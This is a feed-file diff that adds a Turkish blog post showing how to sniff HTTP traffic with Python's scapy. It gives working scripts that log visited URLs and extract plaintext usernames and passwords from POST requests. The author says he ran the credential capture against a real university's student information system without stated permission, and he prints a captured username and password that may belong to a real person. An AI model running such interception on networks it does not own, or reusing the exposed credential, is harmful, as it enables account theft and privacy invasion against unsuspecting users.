@@ -9,6 +9,142 @@
     
         
             <item>
+                <title>Python ile Ağ Üzerinde İzleme Yapma</title>
+                <link>https://aligoren.com/python-ile-ag-uzerinde-izleme-yapma</link>
+                <content:encoded>
+                    <![CDATA[
+                    <p>Merhaba. Bu yazıda Python ile basit bir şekilde ağ üzerinde nasıl izleme yapılırı anlatmaya çalışıcam.
+Yazıya giriş yapmadan önce bazı gereksinimler mevcut. Bunlardan birisi <code>scapy</code></p>
+
+<p>Teknik detaylara giriş yapmadan önce açıklamak gerekirse scapy, network tarafında özelleştirilmiş paketler üretmeye yarayan bir kütüphane.</p>
+
+<p>Kendisi açık kaynak kodlu bir yazılımdır. Scapy’nin diğerlerine göre farkı genişletilebilir oluşunda.
+Diğerleri demişken bunlardan benim bildikleri nmap ve hping var. İlla ki görmüşsünüzdür.</p>
+
+<p>Ayrıca scapy interactive olarak ya da development kısmında da çalışabilir.
+Yani dilerseniz interactive shell ile çalışabilir ya da projenizde kütüphaneyi çağırabilirsiniz.</p>
+
+<h2 id="scapy-ve-scapy-http-kurulumu">scapy ve scapy-http Kurulumu</h2>
+
+<p>Çok uzatmayalım. Ben işlemleri linux dağıtımı üzerinde gerçekleştirdim. Kurulum iki aşamadan oluşuyor.
+Dağıtımınızda pip olduğunu varsayarak şu işlemleri gerçekleştirelim:</p>
+
+<pre><code class="language-bash">sudo apt-get install python-scapy
+sudo pip install scapy_http
+</code></pre>
+
+<p>Kurulum bu kadar Burada <code>scapy_http</code> adında bir kütüphane kullandık.
+Kütüphane yazarı <a href="http://www.lucainvernizzi.net">Luca Invernizzi</a> isimli abimizdir.</p>
+
+<h2 id="scapy-ile-a-trafiinin-zlenmesi">scapy ile Ağ Trafiğinin İzlenmesi</h2>
+
+<p>Yazı iki kısımdan oluşacak. Bu bir adresi kim yani hangi IP ziyaret ediyor ona bakacağız.</p>
+
+<p>Öncelikle scapy ve scapy_http kütüphanesini dahil edelim:</p>
+
+<pre><code class="language-python">from scapy.all import IP, sniff
+from scapy.layers import http
+</code></pre>
+
+<p>Şimdi gelen değerleri sniffleyeceğimiz bir metod yazalım.
+Bu methoddan dönen değerlere göre sniffing işlemi yapacağız.</p>
+
+<p>Bu metodda TCP paketlerini ayıklayacağız.
+Ayıklama işlemi esnasında herhangi bir şekilde HTTP isteğine denk gelirsek ekrana yazdıracağız.</p>
+
+<pre><code class="language-python">def tcp_ayikla(paket):
+    if not paket.haslayer(http.HTTPRequest):
+        # Eğer paket herhangi bir HTTP isteği almıyorsa burayı atlayalım:
+        return
+    
+    #http katmanından geçen istekler
+    http_katmani = paket.getlayer(http.HTTPRequest)
+
+    # IP adresi içeren katman
+    ip_katmani = paket.getlayer(IP)
+    print '\n{0[src]} IP adresinden {1[Method]} {1[Host]}{1[Path]} sitesine ziyaret'.format(ip_katmani.fields, http_katmani.fields)
+
+# Ağ üzerinde dinleme işlemine başlıyoruz:
+sniff(filter='tcp', prn=tcp_ayikla)
+</code></pre>
+<p>Çıktı olarak şöyle görüntüleriz:</p>
+
+<p><img src="images/posts/sniff_url.png" alt="images/posts/sniff_url.png" /></p>
+
+<p>Buraya kadar olan kısım şu <a href="http://www.lucainvernizzi.net/blog/2015/02/12/extracting-urls-from-network-traffic-in-just-9-python-lines-with-scapy-http/">bağlantı</a> üzerinden alıntılandı</p>
+
+<h2 id="scapy-ile-post-verilerinin-alnmas">scapy ile POST Verilerinin Alınması</h2>
+
+<p>Gelelim zurna mıdır nedir onun şey dediği yere.
+Ağ üzerinde herkesin merak ettiği bir diğer konu da internet sitelerine girişte parolaların alınıp alınamayacağıdır.</p>
+
+<p>Yukarıdaki yapıya aşırı benzer bir şekilde POST değerlerini alabilirsiniz.
+Bu işlem SSL olan sistemlerde işe yaramıyor. Bunu belirtmem gerekir.
+Eğer SSL konusunda merakınız varsa tintinweb <a href="https://github.com/tintinweb/scapy-ssl_tls">reposuna</a> bakmalısınız.</p>
+
+<p>Post edilen verileri saf haliyla görebilmemizi sağlayan kodun temeli yukarıdaki ile aynı.
+Geri kalan kısım biraz programlama becerisi istiyor olay o kadar yani.</p>
+
+<pre><code class="language-python">from scapy.all import IP, sniff
+from scapy.layers import http
+ 
+ 
+def tcp_ayikla(paket):
+    if not paket.haslayer(http.HTTPRequest):
+        # Eğer paket herhangi bir HTTP isteği almıyorsa burayı atlayalım:
+        return
+    http_katmani = paket.getlayer(http.HTTPRequest)
+    try:
+        # Gelen istek POST mu?
+        if str(http_katmani.fields["Method"]) == "POST":
+            
+            # Öyle ise dönen değeri böl ve bölünen değerin 13.sünü al
+            # 13. değer form değerlerinin geldiği kısım oluyor
+            data = str(http_katmani).split('\n')[13]
+            # Form değerleri birleşikti bildiğiniz GET query gibi
+            # Önce ampersand kaldırılıp, alt satıra geçme sağlandı
+            #   txtUserName=Falan
+            #   txtPassword=FalanPasswd
+            # Ardından Gelen değerdeki %40, yerini @ ifadesine bıraktı.
+            # Mail için önemli :)
+            data = data.replace('&amp;', '\n').replace('%40', '@')
+            return data
+    except:
+        pass
+ 
+# Ağ üzerinde dinleme işlemine başlıyoruz:
+sniff(filter='tcp', prn=tcp_ayikla)
+</code></pre>
+
+<p>Bu ikinci kodun sonrasında çalıştırdığımızda aşağıdaki gibi bir çıktı ile karşılaşacağız.
+Dikkat ettiyseniz formda bulunan inputların name’leri ve value’ları bu ekranda görüntülenebilmekte</p>
+
+<pre><code>txt_username=16612261
+txt_password=cH10k1997GuVenL
+</code></pre>
+
+<p>Yukarıdaki kullanıcı adı ve parola saf haliyle karşımıza sunulmakta.
+Parola her ne kadar ben güvenliyim imajı verse de izlemek pek de zor olmuyor.</p>
+
+<p>Bu işlemi bir üniversitenin Öğrenci Bilgi Sistemi üzerinde gerçekleştirdim. Umarım problem olmaz :)</p>
+
+<p><img src="images/posts/post_sniffing.png" alt="images/posts/post_sniffing.png" /></p>
+
+<p>Sanırım bir anlatımın daha sonuna geldik. Özetle: SSL kullanın</p>
+
+                    ]]>
+                </content:encoded>
+                <guid isPermaLink="false">/python-ile-ag-uzerinde-izleme-yapma</guid>
+                <description>
+                    
+                </description>
+                <pubDate>Sun, 23 Oct 2016 00:41:00 +0300</pubDate>
+                <author>Ali GÖREN</author>
+            </item>
+        
+    
+        
+            <item>
                 <title>Asp.Net MVC'De Çoklu Checkbox Kullanımı</title>
                 <link>https://aligoren.com/aspnet-mvcde-coklu-checkbox-kullanimi</link>
                 <content:encoded>
